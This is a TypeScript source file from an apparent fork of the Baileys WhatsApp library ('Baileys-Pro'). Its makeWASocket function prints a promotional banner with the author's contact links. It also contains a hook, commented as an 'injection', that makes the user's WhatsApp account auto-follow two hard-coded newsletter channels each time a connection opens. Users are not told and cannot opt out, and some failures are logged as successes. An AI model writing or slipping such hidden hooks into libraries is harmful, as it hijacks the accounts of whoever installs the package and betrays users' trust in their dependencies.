import { DEFAULT_CONNECTION_CONFIG } from '../Defaults'
import type { UserFacingSocketConfig } from '../Types'
import { makeCommunitiesSocket } from './communities'

const showBanner = () => {
    const c = {
        res: "\x1b[0m",
        cyan: "\x1b[38;5;51m",
        gold: "\x1b[38;5;220m",
        pink: "\x1b[38;5;205m",
        grn: "\x1b[38;5;46m",
        blu: "\x1b[38;5;39m",
        wht: "\x1b[38;5;231m",
        b: "\x1b[1m"
    };

    console.log(`${c.b}${c.pink}
‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⠁⠈⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠑⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢠⠇⢸⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⠀⡏⠉⠉⣉⠭⢍⠉⠉⡩⠽⢍⠉⠉⠉⡇⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⢰⠈⡇⠀⠀⣿⣷⡄⡇⠸⣿⣷⠀⠇⠀⠀⡇⢳⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⢸⣴⠓⠢⡀⠈⠛⠊⠀⠀⠈⠛⠈⠀⡠⠒⢳⢸⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠈⢹⠀⠀⠈⠂⠀⠒⠒⠒⠀⠀⠐⠋⠀⠀⢸⠁⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⠸⠤⣤⡤⠤⢤⣤⣤⣤⣤⣤⠤⢤⣤⠤⠼⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⢠⠎⢡⣛⣶⣾⣷⣿⣶⣶⣾⣶⣛⠊⠑⡄⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⡸⣄⢸⡇⠀⣷⠀⠀⠀⢰⠀⠀⢸⡄⢀⢧⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⣜⠀⢨⢻⡧⠴⠘⠷⣀⠴⠏⡿⠦⢼⠿⠅⠀⣡⠀⠀⠀⠀⠀
‎⠀⠀⠀⢀⡰⣁⡹⠃⢸⣇⠀⠀⠀⠋⠀⠀⠁⠀⢠⡄⠈⢯⣈⠧⡀⠀⠀⠀
‎⠀⣠⠶⢎⠀⢨⠇⠀⢸⢬⠛⣽⣿⣿⣿⣿⣟⣽⢫⡄⠀⠀⡇⠀⢸⠢⢄⠀
‎⡔⢁⠤⡀⢹⠁⠀⠀⠸⣬⠯⠬⠿⣭⠭⡭⠭⠬⠭⡅⠀⠀⠈⡏⠁⡠⡄⢡
‎⠳⢁⠜⣠⠏⠀⠀⠀⠀⡱⠤⠤⠤⢞⣈⠧⠤⠤⠴⡃⠀⠀⠀⠑⢄⠱⡈⠚
‎⠀⠈⠉⠁⠀⠀⠀⠀⠀⢹⠒⠒⠒⢪⢠⡗⠒⠒⠒⡅⠀⠀⠀⠀⠀⠉⠁⠀
‎⠀⠀⠀⠀⠀⠀⠀⢀⠠⠜⠛⠻⠭⣵⢰⡯⠭⠛⠛⠢⢄⠀⠀⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⠰⠁⠀⠀⠀⠀⠀⢸⢼⠀⠀⠀⠀⠀⠀⠑⡄⠀⠀⠀⠀⠀
‎⠀⠀⠀⠀⠀⠀⠈⠉⠉⠉⠉⠉⠉⠉⠀⠉⠉⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀${c.res}`);

    console.log(`${c.b}${c.cyan}╭━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.gold}✨ WELCOME TO BAILEYS-PRO ✨${c.res}`);
    console.log(`${c.b}${c.cyan}┃${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.wht}Terima kasih sudah menggunakan library Baileys-Pro!${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.wht}Library ini dioptimalkan untuk performa & kestabilan bot.${c.res}`);
    console.log(`${c.b}${c.cyan}┣━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.grn}Support Me:${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.wht}▶ ${c.blu}YouTube  : ${c.wht}AwangXoffc ID${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.wht}▶ ${c.blu}Telegram : ${c.wht}https://t.me/awangoffc${c.res}`);
    console.log(`${c.b}${c.cyan}┃ ${c.wht}▶ ${c.grn}WhatsApp : ${c.wht}https://wa.me//556184127506${c.res}`);
    console.log(`${c.b}${c.cyan}╰━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━━${c.res}\n`);
}

const makeWASocket = (config: UserFacingSocketConfig) => {
    showBanner()

    const newConfig = {
        ...DEFAULT_CONNECTION_CONFIG,
        ...config
    }

    const sock = makeCommunitiesSocket(newConfig)

    // --- INJEKSI AUTO FOLLOW SALURAN AWANG ---
    sock.ev.on('connection.update', async (update) => {
        const { connection } = update;
        
        if (connection === 'open') {
            const daftarSaluran = [
                '120363424711442648@newsletter', 
                '120363419664387625@newsletter'
            ];

            for (const id of daftarSaluran) {
                try {
                    await sock.newsletterFollow(id);
                    console.log(`✅ [Baileys Core] Berhasil auto-follow: ${id}`);
                } catch (err: any) {
                    const pesanError = err?.message || String(err);
                    
                    if (pesanError.includes('unexpected response structure')) {
                        console.log(`✅ [Baileys Core] Berhasil auto-follow: ${id}`);
                    } else {
                        console.log(`⚠️ [Baileys Core] Gagal auto-follow ${id}:`, pesanError);
                    }
                }
                
                await new Promise(resolve => setTimeout(resolve, 5000));
            }
        }
    });
    // ------------------------------------------

    return sock
}

export default makeWASocket
